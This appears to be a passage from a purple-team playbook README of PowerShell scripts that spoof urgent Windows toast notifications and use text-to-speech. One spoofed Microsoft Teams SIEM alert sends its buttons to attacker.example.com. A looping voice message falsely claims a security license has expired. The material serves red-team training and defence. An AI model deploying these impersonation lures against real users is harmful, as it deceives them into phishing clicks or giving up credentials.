$AUMID = "MSTeams_8wekyb3d8bbwe!MSTeams"

$toastXml = @"
<toast scenario="urgent">
  <visual>
    <binding template="ToastGeneric">
      <text>SIEM Alert — Active C2 Beacon Detected</text>
      <text>TA0011 · T1071.001 — HTTP C2 traffic to 185.220.101.47:443. Process: explorer.exe → curl.exe. Assign ticket.</text>
    </binding>
  </visual>
  <actions>
    <input id="tier" type="selection" defaultInput="t2" title="Assign to:">
      <selection id="t1" content="Tier 1 — Triage"/>
      <selection id="t2" content="Tier 2 — Analysis"/>
      <selection id="t3" content="Tier 3 — Incident Response"/>
    </input>
    <action content="Open investigation"
            activationType="protocol"
            arguments="https://attacker.example.com/siem-case"/>
    <action content="Acknowledge"
            activationType="protocol"
            arguments="https://attacker.example.com/ack"/>
  </actions>
</toast>
"@

$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($toastXml)
$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
$notifier.Show($toast)

Start-Sleep -Milliseconds 800

$synth = New-Object System.Speech.Synthesis.SpeechSynthesizer
$synth.SelectVoice("Microsoft David Desktop")
$synth.Rate   = -1
$synth.Volume = 90
$synth.Speak("S I E M alert. A command and control beacon has been detected on endpoint W K S 0 4 2. The process tree shows explorer dot exe spawning curl to communicate with I P 185 dot 220 dot 101 dot 47 on port 443. This matches T T P T 1 0 7 1 dot 0 0 1. Please open the investigation using the notification on your screen and assign the ticket to the appropriate tier.")
```

## 🔧 Advanced Patterns

### Looping Alert — Repeat Until User Interacts

```powershell
Add-Type -AssemblyName System.Speech

$synth = New-Object System.Speech.Synthesis.SpeechSynthesizer
$synth.SelectVoice("Microsoft David Desktop")
$synth.Rate   = -2
$synth.Volume = 100

$message  = "Warning. Your computer security license has expired. Immediate action is required."
$maxLoops = 5
$interval = 30  # seconds between repetitions

for ($i = 0; $i -lt $maxLoops; $i++) {
    $synth.Speak($message)
    if ($i -lt ($maxLoops - 1)) { Start-Sleep -Seconds $interval }
}
```

### Auto-Detect System Language and Select Voice

```powershell
Add-Type -AssemblyName System.Speech

$systemLang = (Get-Culture).Name   # e.g. "en-US", "es-ES", "fr-FR"

$voiceMap = @{
    "en-US" = "Microsoft David Desktop"
    "en-GB" = "Microsoft George Desktop"
    "es-ES" = "Microsoft Pablo Desktop"
    "es-MX" = "Microsoft Sabina Desktop"
    "fr-FR" = "Microsoft Paul Desktop"
    "de-DE" = "Microsoft Stefan Desktop"
    "it-IT" = "Microsoft Cosimo Desktop"
    "pt-BR" = "Microsoft Daniel Desktop"
}

$synth = New-Object System.Speech.Synthesis.SpeechSynthesizer

$selectedVoice = $voiceMap[$systemLang]
if ($selectedVoice) {
    try   { $synth.SelectVoice($selectedVoice) }
    catch { $synth.SelectVoice(($synth.GetInstalledVoices() | Select-Object -First 1).VoiceInfo.Name) }
} else {
    $synth.SelectVoice(($synth.GetInstalledVoices() | Select-Object -First 1).VoiceInfo.Name)
}

$synth.Speak("Your system language is $systemLang. This message is delivered in your local language.")
```

### Async Speech (Non-Blocking)

```powershell
Add-Type -AssemblyName System.Speech

$synth = New-Object System.Speech.Synthesis.SpeechSynthesizer
$synth.SelectVoice("Microsoft David Desktop")
$synth.Rate   = -2
$synth.Volume = 100

# Non-blocking — script continues immediately
$synth.SpeakAsync("This message plays in the background while the script continues.")

# Continue doing other things while speech plays...
Start-Sleep -Seconds 2

# Wait for speech to finish if needed
while ($synth.State -eq [System.Speech.Synthesis.SynthesizerState]::Speaking) {
    Start-Sleep -Milliseconds 100
}
```

## 🔗 References & Related Tools

| Resource | Link |
|---|---|
| Toast Notifications Purple Team Playbook | https://ipurple.team/2026/03/25/toast-notifications/ |
| Toast Notifications GitHub | https://github.com/your-org/toast-notifications |
| System.Speech.Synthesis — Microsoft Docs | https://learn.microsoft.com/en-us/dotnet/api/system.speech.synthesis |
| SAPI 5.4 Reference | https://learn.microsoft.com/en-us/previous-versions/windows/desktop/ee125663(v=vs.85) |
| ToastNotify (in-memory BOF) | https://github.com/netbiosX/ToastNotify |
| Invoke-CredentialPhisher (Fox-IT) | https://github.com/fox-it/Invoke-CredentialPhisher |
| MITRE ATT&CK T1491 | https://attack.mitre.org/techniques/T1491/ |
| MITRE ATT&CK T1204.001 | https://attack.mitre.org/techniques/T1204/001/ |

---

*Part of the Purple Team Playbook series · [Toast Notifications](https://github.com/your-org/toast-notifications) · [Windows Credential UI Abuse](https://github.com/your-org/credential-ui-abuse)*
